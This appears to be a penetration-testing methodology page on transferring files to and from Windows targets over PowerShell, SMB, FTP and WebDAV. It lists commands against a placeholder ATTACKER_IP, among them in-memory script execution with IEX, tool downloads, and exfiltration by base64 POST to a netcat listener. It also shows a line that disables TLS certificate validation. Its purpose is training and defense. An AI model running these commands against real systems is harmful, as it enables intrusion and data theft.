---
layout: page
title: "File Transfers: Windows"
subtitle: "Moving files to and from Windows hosts with PowerShell, SMB, FTP and WebDAV"
permalink: /methodology/shells-and-transfers/file-transfers-windows/
---

**Purpose:** get files onto a Windows target and retrieve files from it, using PowerShell, SMB, FTP and WebDAV depending on which protocols the target's network allows. Verify each transfer with a file hash.

## Workflow

1. Check which protocols reach the target: HTTP or HTTPS, SMB (445), FTP, WinRM (5985 or 5986).
2. Choose the simplest method that the protocol allows.
3. Hash the file at both ends with `Get-FileHash` or `md5sum`.
4. Clean up the transferred file after use, unless it is evidence to keep.

## Download operations

### Base64 copy and paste

Encode the file on the source host:

```bash
cat id_rsa | base64 -w 0; echo
```

On the Windows target, decode and write it to disk:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64_STRING"))
```

Confirm the file on the target matches:

```powershell
Get-FileHash "C:\Users\Public\id_rsa" -Algorithm MD5
```

### PowerShell WebClient

`System.Net.WebClient` provides several download methods. The commonly used ones are:

| Method | Behaviour |
|---|---|
| `DownloadFile` | Saves the resource to a local file |
| `DownloadFileAsync` | Saves to a file without blocking the calling thread |
| `DownloadString` | Returns the resource as a string |
| `DownloadData` | Returns the resource as a byte array |
| `OpenRead` | Returns the resource as a stream |

Save a file to disk:

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

Run a script directly from memory, which leaves nothing on disk:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/script.ps1')
```

The same pattern works with the script piped into `IEX`:

```powershell
(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/script.ps1') | IEX
```

### Invoke-WebRequest

```powershell
Invoke-WebRequest http://ATTACKER_IP:8000/PowerView.ps1 -OutFile PowerView.ps1
```

### Common errors

- **Internet Explorer engine not initialised.** Add `-UseBasicParsing` to the `Invoke-WebRequest` call.
- **TLS or certificate validation failure.** The notes show disabling certificate validation for the session:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

> Disabling certificate validation removes a protection for every request in the session. Use it only against a test host, and restore the default afterwards.
{: .warning }

### SMB downloads

Start an SMB server on the attack host:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Copy from the target:

```powershell
copy \\ATTACKER_IP\share\nc.exe
```

Newer Windows builds may refuse guest or anonymous SMB access. Start the server with credentials, then map the share with them:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user USERNAME -password PASSWORD
```

```powershell
net use n: \\ATTACKER_IP\share /user:USERNAME PASSWORD
```

### FTP downloads

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://ATTACKER_IP/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Upload operations

### Base64 over an HTTP POST

On the attack host, start a listener that will receive the POST body:

```bash
nc -lvnp 8000
```

On the Windows target, encode the file and send it:

```powershell
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\path\file' -Encoding Byte))
Invoke-WebRequest -Uri http://ATTACKER_IP:8000/ -Method POST -Body $b64
```

Decode on the attack host:

```bash
echo BASE64_STRING | base64 -d -w 0 > output
```

### Uploads with an upload server

PowerShell has no built-in upload cmdlet. Use `Invoke-WebRequest` or `Invoke-RestMethod` against an upload endpoint on the attack host, such as the uploadserver used in [File Transfers: Linux](/methodology/shells-and-transfers/file-transfers-linux/).

### WebDAV

Enterprises often block SMB (445) between internal hosts because it widens the attack surface. WebDAV runs SMB-style file access over HTTP. Serve a directory with wsgidav:

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

From Windows, the special name `DavWWWRoot` tells the Windows shell to connect to the root of a WebDAV server:

```powershell
dir \\ATTACKER_IP\DavWWWRoot
```

## What to look for

- Which of 445, 80, 443, 21, 5985 and 5986 are reachable from the target
- Whether the transfer destination is writable and not monitored
- Whether a hash mismatch indicates a corrupted transfer, a truncated paste, or an encoding issue

## Pitfalls

- Pasting a long base64 string through an interactive shell can truncate it. Compare hashes after decoding.
- SMB guest access is blocked on newer Windows builds. Use credentials on the SMB server.
- The `Get-Content -Encoding Byte` form is needed when reading binary files. Reading text mode corrupts them.

## Defense and prevention

Block unneeded protocols at the host and network layer, including SMB between workstations, FTP, and WebDAV where they are not required. Enable PowerShell script block logging, and alert on `WebClient` or `Invoke-WebRequest` calls that download executables or scripts.
